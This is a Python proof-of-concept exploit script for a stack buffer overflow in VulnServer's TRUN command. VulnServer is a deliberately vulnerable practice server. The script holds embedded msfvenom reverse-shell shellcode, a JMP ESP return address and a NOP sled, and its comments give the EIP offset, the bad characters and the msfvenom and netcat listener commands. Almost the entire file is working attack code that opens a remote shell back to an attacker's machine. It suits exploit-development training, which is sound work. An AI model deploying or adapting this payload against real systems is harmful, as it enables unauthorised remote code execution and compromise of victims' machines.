#!/usr/bin/python


# PoC by Ananth aka she11z
# VulnServer Download: git clone https://github.com/stephenbradshaw/vulnserver.git


import socket
import sys

RHOST = '192.168.1.117'   # Change this
RPORT = 9999
buffer_len = 3000

# EIP offset 386F4337
# Exact match @ 2003
# ESP space for shellcode  'No Restriction'
# Bad characters: "\x00"
# JMP ESP FFE4  "\xFF\xE4" ---->  essfunc.dll : 0x625011af ----> Endian: "\xaf\x11\x50\x62"
# ASLR = DEP = FALSE :)
# Shellcode size: 351 Bytes. NOTE: Keep the buffer length maintained with corresponding changes after shellcode generation.
# msfvenom -p windows/shell_reverse_tcp -a x86 LHOST=<Your IP> LPORT=<Port> -f c -b "\x00" --platform windows EXITFUNC=thread -e x86/shikata_ga_nai
# Listener: nc -lvnp <port>

shellcode = ("\xba\x77\x10\x8e\x67\xd9\xf7\xd9\x74\x24\xf4\x58\x29\xc9\xb1"       # Change this
"\x52\x31\x50\x12\x03\x50\x12\x83\x9f\xec\x6c\x92\xa3\xe5\xf3"
"\x5d\x5b\xf6\x93\xd4\xbe\xc7\x93\x83\xcb\x78\x24\xc7\x99\x74"
"\xcf\x85\x09\x0e\xbd\x01\x3e\xa7\x08\x74\x71\x38\x20\x44\x10"
"\xba\x3b\x99\xf2\x83\xf3\xec\xf3\xc4\xee\x1d\xa1\x9d\x65\xb3"
"\x55\xa9\x30\x08\xde\xe1\xd5\x08\x03\xb1\xd4\x39\x92\xc9\x8e"
"\x99\x15\x1d\xbb\x93\x0d\x42\x86\x6a\xa6\xb0\x7c\x6d\x6e\x89"
"\x7d\xc2\x4f\x25\x8c\x1a\x88\x82\x6f\x69\xe0\xf0\x12\x6a\x37"
"\x8a\xc8\xff\xa3\x2c\x9a\x58\x0f\xcc\x4f\x3e\xc4\xc2\x24\x34"
"\x82\xc6\xbb\x99\xb9\xf3\x30\x1c\x6d\x72\x02\x3b\xa9\xde\xd0"
"\x22\xe8\xba\xb7\x5b\xea\x64\x67\xfe\x61\x88\x7c\x73\x28\xc5"
"\xb1\xbe\xd2\x15\xde\xc9\xa1\x27\x41\x62\x2d\x04\x0a\xac\xaa"
"\x6b\x21\x08\x24\x92\xca\x69\x6d\x51\x9e\x39\x05\x70\x9f\xd1"
"\xd5\x7d\x4a\x75\x85\xd1\x25\x36\x75\x92\x95\xde\x9f\x1d\xc9"
"\xff\xa0\xf7\x62\x95\x5b\x90\x4c\xc2\x62\x0a\x25\x11\x64\xdb"
"\xe9\x9c\x82\xb1\x01\xc9\x1d\x2e\xbb\x50\xd5\xcf\x44\x4f\x90"
"\xd0\xcf\x7c\x65\x9e\x27\x08\x75\x77\xc8\x47\x27\xde\xd7\x7d"
"\x4f\xbc\x4a\x1a\x8f\xcb\x76\xb5\xd8\x9c\x49\xcc\x8c\x30\xf3"
"\x66\xb2\xc8\x65\x40\x76\x17\x56\x4f\x77\xda\xe2\x6b\x67\x22"
"\xea\x37\xd3\xfa\xbd\xe1\x8d\xbc\x17\x40\x67\x17\xcb\x0a\xef"
"\xee\x27\x8d\x69\xef\x6d\x7b\x95\x5e\xd8\x3a\xaa\x6f\x8c\xca"
"\xd3\x8d\x2c\x34\x0e\x16\x4c\xd7\x9a\x63\xe5\x4e\x4f\xce\x68"
"\x71\xba\x0d\x95\xf2\x4e\xee\x62\xea\x3b\xeb\x2f\xac\xd0\x81"
"\x20\x59\xd6\x36\x40\x48")

buffer =  "A" * 2003 + "\xaf\x11\x50\x62" + "\x90" * 16 + shellcode + "C" * (buffer_len-2003-4-16-351)


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
	print "Connecting and sending the buffer......\n"
	connect = s.connect((RHOST,RPORT))
	s.recv(1024)
	s.send(('TRUN /.:/' + buffer))
	print "Done!! Try Harder!! By she11z...."

except:
	print "Error connecting the server. Please check the service status"

s.close()


